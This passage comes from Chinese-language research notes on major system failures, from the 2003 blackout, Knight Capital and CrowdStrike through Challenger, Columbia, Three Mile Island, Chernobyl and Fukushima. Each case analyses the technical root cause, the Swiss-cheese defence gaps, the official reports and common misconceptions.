- **技術根因（精確）**: 多重 latent 條件＋一個軟體觸發。FirstEnergy 控制中心使用 GE Energy 的 XA/21 EMS。告警事件子系統存在 race condition：兩個應用程序競用同一共享資料結構，因一處編碼錯誤使兩者同時取得寫入權、毀損該資料結構，導致告警程序陷入 infinite loop 卡死（約當地時間 14:14）。告警卡死後，未處理事件在佇列堆積，約 30 分鐘內主 EMS 伺服器不堪負荷而當機；備援伺服器接手後也同樣崩潰。操作員因此「看不到任何告警」且不知告警已失效。與此同時，幾條重載高壓線因下垂碰到未修剪的樹木相繼跳脫（Harding-Chamberlin、Hanna-Juniper、Star-South Canton），負載轉移使其餘線路過載、連鎖跳脫，最終在數分鐘內級聯成大停電。GE 事後花約八週、分析約百萬行 C/C++ 才在實驗室重現此「時窗以毫秒計」的競態。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 告警系統靜默失效（latent + trigger）：race condition 讓告警卡死卻「無任何指示」，操作員以為一切正常——最危險的失效是「沉默的失效」。
  - 備援同樣崩潰（latent）：備援 EMS 伺服器接手後因同樣的事件積壓而崩潰，冗餘無法擋住 common-mode 的負載問題。
  - 樹木修剪不足（latent）：FirstEnergy 對輸電走廊植被管理不足，使線路下垂即碰樹跳脫（任務小組四大群因之一）。
  - 情境覺察與系統理解不足（latent）：FirstEnergy 與可靠度協調者（MISO）缺乏即時狀態工具與全域視野，無法及時診斷（四大群因之二、四）。
  - 跨區協調缺失（latent）：鄰近電力公司與協調機構未及早察覺 FirstEnergy 的危機、未及時隔離。
- **官方調查 / 關鍵結論 + URL**: *U.S.-Canada Power System Outage Task Force — Final Report on the August 14, 2003 Blackout in the United States and Canada: Causes and Recommendations*，2004-04。四大根因群：(1) 系統理解不足、(2) 情境覺察不足、(3) 樹木修剪不足、(4) 可靠度協調者診斷支援不足。技術觸發確認為 FirstEnergy XA/21 告警程序的軟體缺陷。報告 PDF（NERC）: https://www.nerc.com/pa/rrm/ea/Documents/August_2003_Blackout_Final_Report.pdf ；告警 race condition 技術細節（GE Energy 受訪）見 The Register: https://www.theregister.com/2004/04/08/blackout_bug_report/
- **常見誤解 / 要校準的迷思**:
  - 「就是一棵樹/一條線造成全美東北停電」：不完整。樹是 latent 條件之一；把單機/單線正常的跳脫放大成級聯的是「告警靜默失效＋情境覺察喪失」。
  - 「軟體 bug 直接造成停電」：要校準——軟體 bug 直接造成的是「告警與監視失效」，使操作員失去糾正窗口；停電是接連的線路過載級聯。
  - 「電網設計就會這樣連鎖崩」：要校準——電網設計有保護分區，是「人看不到問題、未及時手動處置」讓本應局部的事件擴散。
  - 「死了很多人」：要校準——直接死亡為個位數至約 11（多為間接），規模在於 5,000 萬人受影響而非死亡數。
- **信心**: ✔ 技術機制與四大群因 rock-solid（任務小組一級報告＋GE 受訪確認 race condition）。⚠️ 僅死亡人數與經濟損失金額為估計、各源不一。

## 10. Knight Capital（2012-08-01）— 4.4 億美元、休眠旗標 + 部分部署

- **日期 / 地點**: 2012-08-01，紐約證交所開盤後 45 分鐘內；Knight Capital Americas LLC 的自動下單系統 SMARS。✔（SEC Order 34-70694）
- **死傷 / 規模**: 無人傷亡。Knight 在約 45 分鐘內因錯誤交易累積淨部位：80 檔股票淨多約 35 億美元、74 檔淨空約 31.5 億美元，平倉後損失逾 4.6 億美元（稅前約 4.4 億美元，即常引的 $440M）；SEC 後續處 1,200 萬美元 (US$12M) 罰款；公司瀕臨破產，數日後被收購。✔（SEC Order 數字）
- **技術根因（精確）**: 為配合 NYSE 新的 Retail Liquidity Program（RLP），Knight 在 2012-07-27 至 08-01 間把新 RLP 程式碼手動部署到 8 台 SMARS 伺服器，但一名技術人員漏掉了其中 1 台（只部署到 7/8）。新碼「重用」了一個過去用來啟動舊「Power Peg」功能的旗標——Power Peg 是 2003 年起即停用的舊測試/下單功能，且其「計數並限制子單對母單數量」的邏輯早已被移走。8/1 開盤時，當這個旗標被啟用，那台未更新的第 8 台伺服器上的舊 Power Peg 碼被喚醒：它對收到的母單瘋狂送出子單、卻不計數也不對照已成交量去停止，於是無限制地把單灌進市場。約 45 分鐘內送出數百萬筆委託、實際成交 400 萬筆、涉 154 檔股票、逾 3.97 億股。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 手動部署、無第二人複核（latent）：技術人員手動逐台部署、漏一台，且無自動化部署與第二人驗證（SEC 點名缺乏部署複核）。
  - 重用舊旗標、未移除死碼（latent）：新功能重用啟動舊 Power Peg 的旗標，而 Power Peg 死碼從未被刪除——休眠的危險程式碼是定時炸彈。
  - 失去訂單上限/熔斷（latent）：Power Peg 的數量限制邏輯被移走後，那段碼變成「無上限灌單」，且系統層級缺乏總量/部位的硬性防呆（違反 Market Access Rule 15c3-5）。
  - 告警被當噪音（trigger 放大）：開盤前約 33 分鐘，系統發出 97 封提及 SMARS 與 Power Peg 的自動 email，但這些 email 未被設計成正式告警、無人當回事。
  - 環境不一致（latent）：7 台跑新碼、1 台跑舊碼的混合狀態，正是最難偵錯的組態漂移。
- **官方調查 / 關鍵結論 + URL**: U.S. SEC, *In the Matter of Knight Capital Americas LLC*, Order, Release No. 34-70694, 2013-10-16——首件依 Market Access Rule（Rule 15c3-5）的執法案。結論：Knight 缺乏防止錯誤下單的部署、變更管理與風控控制。SEC Order PDF: https://www.sec.gov/files/litigation/admin/2013/34-70694.pdf
- **常見誤解 / 要校準的迷思**:
  - 「演算法交易出錯/AI 失控」：錯。不是演算法本身錯，是「部署漏一台＋喚醒了一段早該刪的死碼」的運維/變更管理失敗。
  - 「一行壞程式」：錯。沒有新寫的壞邏輯；是「重用旗標啟動了舊死碼＋部分部署」的組合。
  - 「45 分鐘就賠 4.4 億是市場崩盤」：要校準——是 Knight 自己無限制灌單推高/壓低自家成交價、累積巨額部位後平倉的損失，非外部市場崩盤。
  - 「沒有任何警訊」：錯——開盤前已有 97 封提及 Power Peg 的 email，但未被當成告警處置。
- **信心**: ✔ rock-solid（SEC Order 原文逐項核對；4.4 億稅前/4.6 億總損、45 分鐘、400 萬成交、154 檔、3.97 億股、97 封 email、1,200 萬罰款皆官方）。

## 11. CrowdStrike Falcon 大當機（2024-07-19）— 內容更新使 Windows 藍屏

- **日期 / 地點**: 2024-07-19（UTC 約 04:09 推送），全球 Windows 主機；CrowdStrike Falcon sensor。✔（CrowdStrike RCA）
- **死傷 / 規模**: 無直接傷亡。約 850 萬台 Windows 裝置受影響（CrowdStrike/微軟估計）；全球航空、醫療、金融、零售大規模中斷（航班停飛、醫院系統當機等）；多方估計直接經濟損失逾 50 億美元（保險業估算，數字 ⚠️ 因估法而異）。✔（約 850 萬台為官方/微軟引用）/ ⚠️（經濟損失金額）
- **技術根因（精確）**: 出問題的是一個 Rapid Response Content 更新——Channel File 291，對應 IPC（inter-process communication）Template Type。該 IPC Template Type 在定義時宣告了 21 個輸入參數欄位，但 sensor 程式（Template Instances）實際只提供 20 個；新規則卻引用了並不存在的第 21 個欄位。當 sensor 的 Content Interpreter 在執行期評估此規則時，發生 out-of-bounds read（越界讀取）。由於 Falcon sensor 在 kernel mode（核心態）運行，此越界讀取直接造成系統當機（BSOD），且因該檔在開機早期載入，機器一開機就藍屏、陷入重啟迴圈，難以遠端修復（多需手動進安全模式刪檔）。問題檔約 78 分鐘後撤回，但已上線的機器需逐台人工處理。
- **防禦的孔洞（Swiss-cheese holes）**:
  - Content Validator 有 bug（latent）：本應攔截此類不符的驗證器存在邏輯錯誤，讓 21 vs 20 欄位不符的內容通過驗證。
  - Rapid Response Content 無分階段/金絲雀發布（latent）：這類內容更新一次性推送全球所有 sensor，無 canary、無分批，缺陷一上線即全球同時爆。
  - 核心態擴大爆炸半徑（latent）：sensor 在 kernel mode，任何記憶體錯誤直接造成整機藍屏而非單一程序崩潰——降級失敗、無沙箱隔離。
  - 開機早期載入使自我修復困難（latent）：藍屏發生在開機早期，機器無法正常開機接收修正，把「軟體可遠端回滾」變成「需到場手動修」。
  - 內容更新被當成「資料」而非「程式碼」對待（latent）：Rapid Response Content 雖被視為設定/資料，實質會驅動核心態解譯執行，卻未套用與程式碼同等的測試/灰度發布紀律。
- **官方調查 / 關鍵結論 + URL**: CrowdStrike 官方 *Channel File 291 Incident — Root Cause Analysis*（2024-08-06）及 Preliminary Post Incident Review。結論：欄位數不符（21 vs 20）導致越界讀取、Content Validator 缺陷未攔截、且缺乏分階段發布。RCA PDF: https://www.crowdstrike.com/wp-content/uploads/2024/08/Channel-File-291-Incident-Root-Cause-Analysis-08.06.2024.pdf ；RCA 部落格: https://www.crowdstrike.com/en-us/blog/channel-file-291-rca-available/
- **常見誤解 / 要校準的迷思**:
  - 「微軟/Windows 出包」：錯。是 CrowdStrike 的 Falcon 內容更新，非 Windows 更新；微軟只是受害平台。
  - 「是一次 OS 更新害的」：錯。它是防毒/EDR 廠商推的「內容（規則）更新」，不是作業系統或驅動程式版本更新。
  - 「全空檔案/null pointer」：要校準——早期傳言是「全是 0 的檔案」，官方 RCA 證實是「21 vs 20 欄位不符導致越界讀取」，非單純空檔。
  - 「850 萬台是被駭」：錯。無攻擊；是自家有缺陷的更新＋無灰度發布。
- **信心**: ✔ 技術根因 rock-solid（CrowdStrike 官方 RCA 逐項確認）。⚠️ 僅「經濟損失金額」為第三方估計、差異大。

## 12. AWS S3 us-east-1 大當機（2017-02-28）—（板凳備選）

- **日期 / 地點**: 2017-02-28，AWS US-EAST-1 區域；起於 09:37 PST。✔（AWS 官方 postmortem）
- **死傷 / 規模**: 無傷亡。S3 在 US-EAST-1 約中斷數小時（GET/LIST/DELETE 約 12:26–13:18 PST 恢復、PUT/placement 約 13:54 PST 全恢復），大量依賴 S3 的網站/服務（含許多第三方 SaaS）連帶中斷；估計企業損失達數億美元級（第三方估計，⚠️）。✔（時間軸為官方）/ ⚠️（金額）
- **技術根因（精確）**: S3 團隊在排查 billing 系統變慢的問題時，一名獲授權的工程師依既定 playbook 執行指令，原意是移除 billing 子系統的少量伺服器；但其中一個輸入參數打錯（typo），導致移除的伺服器數量遠多於預期，連帶把 S3 的 index 子系統（管理該區域所有物件的 metadata 與位置）與 placement 子系統（為新物件分配儲存）一併打掉大半。這兩個子系統必須完整重啟才能恢復，而它們已多年未做完整重啟、期間容量大幅成長，重啟與安全檢查耗時數小時。期間 AWS 自家 Service Health Dashboard 因本身依賴 S3，無法更新狀態（11:37 PST 前無法顯示故障）。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 指令缺乏防呆/上限（latent）：移除伺服器的工具未對「一次最多移除多少」設硬性上限或二次確認，一個 typo 就能掃掉一大片。
  - 子系統長期未重啟、重啟時間未知（latent）：index/placement 多年未完整重啟，重啟耗時已遠超預期，無人驗證「完整重啟需多久」。
  - 爆炸半徑過大（latent）：單一區域的核心子系統被一條指令同時重創，缺乏分區/分片隔離限制單次操作影響範圍。
  - 監控自我依賴（latent）：狀態儀表板自身跑在它要監控的 S3 上——故障時連「告知客戶故障」都做不到（與 Knight、Meta 同類的循環依賴）。
- **官方調查 / 關鍵結論 + URL**: AWS 官方事後說明 *Summary of the Amazon S3 Service Disruption in the Northern Virginia (US-EAST-1) Region*。修正：限制該工具一次可移除的容量、加入移除速率上限與最低容量保護、改善子系統重啟速度、把 Dashboard 改為跨多區域不依賴單一區域。URL: https://aws.amazon.com/message/41926/
- **常見誤解 / 要校準的迷思**:
  - 「打錯一個字就搞垮半個網際網路」：要校準——typo 是觸發，真正放大的是「工具無上限防呆＋核心子系統重啟極慢＋爆炸半徑無隔離」。
  - 「AWS 整個掛了」：不精確。是 US-EAST-1 單一區域的 S3，但因太多服務集中此區、且彼此依賴，外溢效應極廣。
  - 「駭客攻擊」：錯。內部維運操作失誤。
- **信心**: ✔ rock-solid（AWS 官方 postmortem，時間軸精確）。板凳備選：與 Knight/Meta 同屬「單一操作＋無防呆＋爆炸半徑」主題，作為對照短案例佳；若獨立成章與 Meta 主題重疊。

## 13. Meta/Facebook 全球 BGP 大斷線（2021-10-04）—（板凳備選）

- **日期 / 地點**: 2021-10-04，約 15:39 UTC 起、約 21:05 UTC 恢復；全球。影響 Facebook、Instagram、WhatsApp、Messenger 及 Meta 內部系統。✔（Meta 工程部落格）
- **死傷 / 規模**: 無傷亡。約 6 小時全球性服務中斷，影響數十億使用者；Meta 股價與營收受創（單日市值蒸發數百億美元級，⚠️ 為市場波動估計）。✔（約 6 小時、全球為官方）
- **技術根因（精確）**: 一次例行維護中，工程師下達一條本意是「評估全球骨幹網路可用容量」的指令，卻意外切斷了 Meta 骨幹網路的所有連線，使全球各資料中心彼此斷聯。Meta 本有一套稽核指令、防止此類錯誤的工具，但該稽核工具有 bug、未能攔截這條指令。連鎖：Meta 的權威 DNS 伺服器被設計成「若偵測到自己無法連到資料中心（視為網路不健康），就撤回（withdraw）對自身 IP prefix 的 BGP 廣播」。當整個骨幹被切斷，這些 DNS 節點全部判定自己不健康、紛紛撤回 BGP 廣播——於是 Meta 的 DNS 從全球網際網路「消失」，即使伺服器本身仍在運作，外界也無法解析 facebook.com。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 稽核工具有 bug（latent）：本該攔截危險指令的稽核機制失效，讓「切斷整個骨幹」的指令通過。
  - 自我保護機制反成自毀（latent）：DNS「不健康就撤回 BGP」本是防呆設計，但在「全骨幹斷」的情境下，所有節點同時撤回，把局部保護放大成全球自我下線。
  - 帶外管理也依賴同一網路（latent）：骨幹一斷，工程師連遠端登入資料中心、內部工具都失效（DNS 全失使內部工具也壞），被迫派人到實體機房。
  - 實體門禁也依賴受影響系統（latent）：報導指部分機房門禁/實體存取系統亦受牽連，延長了現場修復時間。
- **官方調查 / 關鍵結論 + URL**: Meta 官方 *More details about the October 4 outage*（Engineering at Meta，2021-10-05）。結論：維護指令意外切斷骨幹、稽核工具 bug 未攔截、DNS 的 BGP 撤回機制把故障放大成全球不可達、帶外修復受阻。URL: https://engineering.fb.com/2021/10/05/networking-traffic/outage-details/ ；獨立網路分析（Cloudflare）: https://blog.cloudflare.com/october-2021-facebook-outage/
- **常見誤解 / 要校準的迷思**:
  - 「Facebook 被駭/被攻擊」：錯。Meta 明確指為內部維護指令錯誤＋稽核工具失效，無外部攻擊。
  - 「DNS 壞了」：要校準——DNS 伺服器本身沒壞，是它們依設計主動撤回 BGP 廣播、讓自己從網際網路消失。
  - 「BGP 設定打錯一行」：不完整——是「一條維護指令切斷骨幹」加上「DNS 自動撤回 BGP」的連鎖；稽核工具未攔截是關鍵漏洞。
  - 「重開機就好」：要校準——因帶外管理也失效、需實體進機房，恢復才拖到約 6 小時。
- **信心**: ✔ rock-solid（Meta 官方說明＋Cloudflare/ThousandEyes 獨立佐證）。板凳備選：與 AWS S3、AT&T 同屬「自動保護機制反噬／級聯」主題，循環依賴（連修復工具都掛）的教訓鮮明。

---

# D. 漂移入失效 / 偏差正常化 / 組織

## 14. Challenger（1986）— O-ring、偏差正常化、發射前夜電話會議

- **日期 / 地點**: 1986-01-28，上午自佛州 Kennedy Space Center 發射；任務 STS-51-L。發射後 73 秒太空梭解體。✔
- **死傷 / 規模**: 機上 7 名太空人全數罹難（含教師 Christa McAuliffe）。✔（Rogers Commission）
- **技術根因（精確）**: 右側固體火箭推進器（SRB）的場接頭（field joint）密封失效。SRB 各段間以兩道 O-ring（橡膠環）密封燃燒氣體。發射當日清晨氣溫約 −1 ~ 2°C（約 36°F，遠低於以往發射），低溫使 O-ring 橡膠變硬、失去彈性，無法及時跟隨接頭因內壓而張開的微小縫隙（joint rotation）回彈密封。點火瞬間熾熱燃氣噴穿 O-ring（發射時影像可見一縷黑煙），雖一度被熔渣暫時封住，約 58–73 秒間一陣強烈風切使破口重新洞開，火舌燒穿外部燃料箱、釀成結構崩解。Feynman 在聽證會以一杯冰水夾住 O-ring 樣本示範其低溫失去彈性，使根因家喻戶曉。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 偏差正常化（normalization of deviance，latent，Vaughan 的核心論點）：先前飛行已多次出現 O-ring 侵蝕/吹漏（blow-by），每一次「沒出事」都被當成「裕度證明」、把異常逐步當成可接受的常態，而非該修的設計缺陷。
  - 工程師反對被推翻（trigger）：發射前夜 1986-01-27 的電話會議中，Morton Thiokol 工程師（Roger Boisjoly 等）依資料建議「氣溫低於 53°F 不應發射」，但在 NASA 施壓與 Thiokol 管理層「拿下你的工程師帽、戴上管理者帽」的轉向下，反對被推翻、改為建議發射。
  - 風險溝通失真（latent）：管理層宣稱整機失敗率約 1/100,000，工程師實際估約 1/100–1/200（Feynman Appendix F）——管理樂觀與工程現實嚴重脫節。
  - 趕進度的組織壓力（latent）：發射時程壓力（教師上太空的公關期程等）使「不發射」的決定門檻被抬高。
  - 設計本身脆弱（latent）：場接頭的密封設計對接頭旋轉與低溫敏感，本就缺乏足夠裕度。
- **官方調查 / 關鍵結論 + URL**: *Report of the Presidential Commission on the Space Shuttle Challenger Accident*（Rogers Commission），1986-06-09。結論：物理因是低溫下 O-ring 密封失效；但 contributing cause 是 NASA 的決策過程與安全文化缺陷（風險溝通、忽視工程警告）。Feynman 的 Appendix F 名言：「For a successful technology, reality must take precedence over public relations, for nature cannot be fooled.」報告（NASA 全文）: https://history.nasa.gov/rogersrep/genindex.htm ；Feynman Appendix F: https://www.nasa.gov/history/rogersrep/v2appf.htm （Caltech PDF: https://calteches.library.caltech.edu/3570/1/Feynman.pdf）
- **常見誤解 / 要校準的迷思**:
  - 「一個 O-ring 失效的工程意外」：不完整。物理因是 O-ring，但 Rogers Commission 與 Vaughan 強調根因是「偏差正常化」與決策/文化失敗——工程師早就警告、且被推翻。
  - 「爆炸（explosion）」：要校準——技術上是空氣動力負荷下的結構崩解（breakup/disintegration），非化學爆炸；外燃料箱推進劑燃燒形成大火球，但太空梭是被解體而非「炸開」。
  - 「無人事先知道有風險」：錯。工程師發射前夜明確反對；風險已知卻被組織壓過。
  - 「Feynman 一個人查出真相」：要校準——他的冰水示範極具影響力，但根因由整個委員會與工程證據確立，Feynman 的貢獻在點破文化/風險溝通問題。
- **信心**: ✔ rock-solid（Rogers Commission 一級報告＋Feynman Appendix F 原文；7 死、73 秒、O-ring、低溫、1/100,000 vs 1/100 皆有來源）。

## 15. Columbia（2003）— 泡棉撞擊、CAIB 的組織病理發現

- **日期 / 地點**: 發射 2003-01-16（STS-107）；2003-02-01 重返大氣層時在德州/路易斯安那上空解體，預定降落前約 16 分鐘失聯。✔
- **死傷 / 規模**: 機上 7 名太空人全數罹難。✔（CAIB）
- **技術根因（精確）**: 發射後約 81.7–81.9 秒，外部燃料箱左側 bipod ramp 一塊絕熱泡棉（約 1.67 磅／約 760 克、約公事包大小、約 21–27 吋長）脫落，以相對約 545 mph（約 877 km/h）撞上左翼前緣的 RCC（reinforced carbon-carbon，強化碳碳複合材料）第 8 號面板，撞出一個破口。重返大氣層時，約 1,600°C 的高溫電漿經此破口灌入左翼內部結構，熔毀翼樑與感測線路，左翼漸失完整性、氣動失衡，太空梭最終在高超音速下解體。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 泡棉脫落被正常化（latent，與 Challenger 同構）：泡棉脫落幾乎每次飛行都發生、被管理層當成「維修問題」而非「飛安問題」，逐步接受為可容忍——CAIB 明指這是 Challenger 文化病的重演。
  - 在軌成像請求被駁回（trigger）：工程師多次請求動用軍方衛星或在軌拍攝左翼受損處評估，被管理層以「即使有損也無能為力／不必要」為由駁回，喪失發現與（理論上）救援的機會。
  - 組織根因深植於計畫史與文化（latent）：CAIB 名言式結論——組織因素「根植於太空梭計畫的歷史與文化」，包括趕進度、預算壓力、把成功當理所當然、壓抑異議。
  - 安全組織無實權（latent）：安全部門缺乏獨立性與資源，無法有效挑戰計畫決策。
  - 對 RCC 撞擊脆弱性認識不足（latent）：低估了泡棉以高速撞擊 RCC 的破壞力（地面測試後來才證實能撞出大洞）。
- **官方調查 / 關鍵結論 + URL**: *Columbia Accident Investigation Board (CAIB) Report, Volume I*，2003-08-26。結論：物理因是泡棉撞破 RCC、重返時電漿入侵；但「組織因與物理因同等重要」，且 NASA 未從 Challenger 學到教訓——同樣的偏差正常化、被壓抑的工程異議、失能的安全文化。報告 PDF: https://www.nasa.gov/wp-content/uploads/2023/03/caib-report-volume1.pdf （備援: https://ehss.energy.gov/deprep/archive/documents/0308_caib_report_volume1.pdf）
- **常見誤解 / 要校準的迷思**:
  - 「一塊泡棉的意外」：不完整。CAIB 的重點是「為何明知泡棉會掉、卻接受它」——組織病理與 Challenger 如出一轍。
  - 「無法可救」：要校準——CAIB 認為若及早成像確認破損，理論上存在搶救/應急方案的探討空間；致命的是連「去看一眼」的請求都被駁回。
  - 「重返時太熱解體，跟發射無關」：錯。發射時的泡棉撞擊已造成破口；重返高溫只是讓既存破口致命。
  - 「跟 Challenger 是兩回事」：CAIB 明確反對——兩者組織根因同源，是同一文化病的兩次發作。
- **信心**: ✔ rock-solid（CAIB Vol I 一級報告；7 死、81.7s、545 mph、RCC panel 8、組織根因皆有來源）。泡棉重量約 1.67 lb 為 CAIB 數字。

## 16. Three Mile Island（1979）— PORV 卡開、指示燈/介面混淆（Perrow 的原型案例）

- **日期 / 地點**: 1979-03-28 約凌晨 4:00，賓州 Harrisburg 附近 Three Mile Island 核電廠 Unit 2（TMI-2）。✔
- **死傷 / 規模**: 零死亡、無可偵測的公眾健康影響（10 英里內居民平均輻射劑量約 0.08 mSv）。爐心約 45%（約 62 噸）熔毀，但壓力槽保持完整、無大規模外洩。✔（無傷亡為一級結論；爐心熔毀比例為事後調查）
- **技術根因（精確）**: 二次側給水/汽機跳脫後，一次側壓力上升，PORV（pilot-operated relief valve，導向式釋壓閥）依設計開啟洩壓；壓力回落後 PORV 本應關閉，卻機械卡在開啟位置，持續洩漏爐水（small-break LOCA，小破口失水事故）。致命的介面缺陷：控制室那盞「PORV 燈」其實只反映「是否對驅動 PORV 的電磁閥送出關閉訊號」，而非閥門的實際開閉位置。訊號送出後燈滅，操作員據此誤以為閥已關閉，實際閥仍開著漏水達約 2 小時 20 分。更糟的是，操作員因加壓器水位上升（被卡開的 PORV 與蒸汽形成假象）誤判「系統水太多」，反而手動節流了高壓注水（ECCS/HPI），使失水雪上加霜、加速爐心裸露熔毀。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 指示燈反映「指令」而非「狀態」（latent，經典 HMI 缺陷）：燈亮/滅只代表訊號有無，不代表閥門真實位置；正常時兩者一致，使操作員長期習慣性信任此燈。
  - 違反直覺的儀表組合（latent）：加壓器水位高 + 系統其實在失水，這組讀數誤導操作員做出完全相反的處置（節流注水）。
  - 訓練與心智模型錯誤（latent）：操作員被訓練成「最怕加壓器灌滿（go solid）」，於是看到水位高就直覺減注水——心智模型與當下實況背道而馳。
  - 警報洪流（latent）：事故初期上百個警報同時響起、印表機落後，操作員淹沒在資訊中無法辨識關鍵訊號。
  - 先前同型事件未被傳播（latent）：另一座電廠（Davis-Besse）曾發生類似 PORV 卡開事件、有人寫過警示備忘，但未被廣傳到 TMI——組織學習失敗。
- **官方調查 / 關鍵結論 + URL**: *Report of the President's Commission on the Accident at Three Mile Island*（Kemeny Commission），1979-10。結論：設備故障（卡開的 PORV）只是起點，真正的嚴重化來自人機介面缺陷、操作員訓練不足、與 NRC/產業的態度與組織問題——「需要的是組織、程序、實務，尤其是態度上的根本改變」。此案是 Charles Perrow《Normal Accidents》（1984）的原型，提出「緊耦合＋互動複雜性使嚴重事故成為系統的正常產物」。報告: https://www.nrc.gov/reading-rm/doc-collections/news/2019/19-016.pdf （Kemeny 報告全文常見於 https://www.threemileisland.org/ 與 NRC 館藏）
- **常見誤解 / 要校準的迷思**:
  - 「核災死了很多人」：錯。TMI 零死亡、無可偵測公眾健康影響；它的意義在「差點」與「為何差點」，不在傷亡。
  - 「操作員笨/亂操作」：要校準——操作員的處置在他們被誤導的心智模型下是「合理」的；錯在介面與訓練讓他們建立了錯誤模型（Perrow 與 Kemeny 都強調系統而非個人）。
  - 「PORV 卡住是主因」：不完整。卡開的 PORV 只是觸發；放大成部分熔毀的是「指示燈騙人＋操作員反向處置（關小注水）」。
  - 「跟 Chernobyl 一樣」：錯。TMI 圍阻體保住、無大規模外洩、零死亡；性質與規模都與 Chernobyl 天差地別。
- **信心**: ✔ rock-solid（Kemeny Commission 一級報告＋NRC；零死亡、PORV 指示燈缺陷、節流注水皆有來源）。

## 17. Chernobyl（1986）— 安全測試、停用保護、正空泡係數 + AZ-5/控制棒尖端設計缺陷、生產壓力

- **日期 / 地點**: 1986-04-26 約 01:23（當地時間），蘇聯烏克蘭 Chernobyl 核電廠 Unit 4（RBMK-1000 型反應爐）。✔
- **死傷 / 規模**: 爆炸當場 2 人死亡；其後數週內 28 人死於急性放射病（ARS）——短期確認死亡約 31 人（一說「約 30」）。長期癌症死亡高度爭議⚠️：WHO/IAEA Chernobyl Forum 估計在最高暴露族群中可能約 4,000 例可歸因死亡（含約 5,000 例甲狀腺癌、其中約 15 例致死）；其他機構（如部分 NGO/Greenpeace）估計高達數萬至數十萬，方法學差異極大。書寫時用「確認短期死亡約 31 人；長期可歸因死亡估計差異極大，從約數千到數萬不等」並標 ⚠️。✔（短期 31）/ ⚠️（長期）
- **技術根因（精確）**: 事故發生在一場「汽機慣性供電」安全測試中（測試汽機在斷汽後靠慣性能否短暫供電）。為做測試，操作員把反應爐降到低功率，卻因氙中毒（xenon-135 poisoning）功率掉到極低、不穩；為提功率違規抽出過多控制棒、並停用/旁路多項安全保護（含緊急爐心冷卻、低水位/低功率自動停機）。RBMK 的兩個致命物理特性在此狀態爆發：(1) 大的正空泡係數（positive void coefficient）——冷卻水沸騰成蒸汽（void）時中子吸收減少、反應性反而上升，在低功率時尤其失控，形成正回饋。(2) 控制棒尖端的石墨置換器設計缺陷：當操作員按下 AZ-5 緊急停機鈕、控制棒從最上方插入時，棒尖的石墨段先把吸收中子的水從爐底排開，導致插入的「最初幾秒」反應性不降反升（「正向 scram / positive scram」）。於是本該救命的緊急停機，反而在一個已經臨界失控的爐心點了把火——功率在數秒內暴增到額定的數十倍，蒸汽爆炸掀飛 1,000 噸的爐頂蓋、隨後氫氣/石墨燃燒，把放射性物質拋向大氣。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 反應爐物理設計本身就危險（latent，INSAG-7 的修正重點）：大正空泡係數 + 控制棒正向 scram 使爐在某些運行域天生不穩、且緊急停機可能適得其反。
  - 安全保護被刻意停用（trigger）：為完成測試而旁路 ECCS、停掉低功率/低水位自動停機，把最後防線一一拆除。
  - 違規進入禁區運行（latent）：低功率、氙中毒、控制棒幾乎全抽出——進入運行規程禁止的高度不穩定狀態。
  - 操作員不知道 AZ-5 的致命特性（latent）：控制棒正向 scram 缺陷此前已知於部分設計者，但未告知操作員、未列入規程（資訊封閉、生產/政治壓力下隱瞞）。
  - 生產與政治壓力＋安全文化缺失（latent）：測試一再延後、當班趕著完成，蘇聯體制下的保密與「不容失敗」文化壓過安全。
- **官方調查 / 關鍵結論 + URL**: IAEA INSAG-1（1986，偏重操作員失誤）後被 INSAG-7（*The Chernobyl Accident: Updating of INSAG-1*，1992）修正——把根因從「主要是操作員違規」改為「反應爐設計缺陷（正空泡係數、控制棒正向 scram）與安全文化缺失為首要，操作員違規為觸發」。INSAG-7 PDF: https://www-pub.iaea.org/MTCD/publications/PDF/Pub913e_web.pdf ；World Nuclear Association 概覽: https://world-nuclear.org/information-library/safety-and-security/safety-of-plants/chernobyl-accident
- **常見誤解 / 要校準的迷思**:
  - 「純粹是操作員亂搞/蘇聯工人無能」：被 INSAG-7 推翻。早期 INSAG-1 與蘇聯官方歸咎操作員；INSAG-7 確認反應爐設計缺陷（正空泡係數＋控制棒正向 scram）才是首要根因，操作員違規是觸發。
  - 「按下緊急停機鈕（AZ-5）應該會關掉反應爐」：這正是最反直覺的關鍵——AZ-5 因控制棒石墨尖端設計缺陷，在那一刻反而短暫提高反應性，成了引爆的最後一擊（positive scram）。
  - 「是核爆（像原子彈）」：錯。是失控功率暴增造成的蒸汽爆炸＋後續石墨/氫氣燃燒，非核子鏈式爆炸。
  - 「死了好幾十萬人」：要校準——短期確認約 31 死；長期可歸因死亡估計從約數千（WHO）到數萬不等、方法學爭議極大，不應引用單一聳動數字。
- **信心**: ⚠️ 技術根因與 INSAG-7 修正 rock-solid；但「長期死亡人數」高度爭議，必須以區間表述並標 ⚠️。

## 18. Fukushima Daiichi（2011）— 海嘯牆高度假設、station blackout —（板凳備選）

- **日期 / 地點**: 2011-03-11，日本福島第一核電廠；東北地方太平洋近海地震（規模 M9.0）引發海嘯襲擊。✔
- **死傷 / 規模**: 核事故本身的直接輻射致死：官方認定極少（一名工人後經認定因輻射致肺癌死亡）。但約 16 萬人疏散；疏散過程與長期影響造成的死亡（含災後壓力、醫療中斷）達數百至約 2,000 人以上（日本政府的「災害關聯死」統計，⚠️）。地震/海嘯本身（非核事故）造成約 1.8 萬人死亡/失蹤。書寫時嚴格區分「輻射直接致死極少」與「疏散關聯死數百至逾兩千」。✔（疏散規模）/ ⚠️（關聯死數字）
- **技術根因（精確）**: 地震後反應爐成功 scram，但海嘯（最大浪高約 13–15 公尺）遠超電廠設計防護的海嘯牆/基準（設計約 5.7 公尺，後曾評估約 10 公尺風險未充分因應）。海嘯淹沒了位於低處的緊急柴油發電機與配電盤，造成 station blackout（全廠斷電）——失去交流電後，爐心冷卻系統停擺，1、2、3 號機爐心相繼熔毀；鋯水反應產生的氫氣累積、發生氫氣爆炸炸毀廠房，釋出放射性物質。根本是「對最大可能海嘯的假設過低」與「把所有應急電源放在同一個會被同一場海嘯淹掉的低處」的 common-mode 脆弱。
- **防禦的孔洞（Swiss-cheese holes）**:
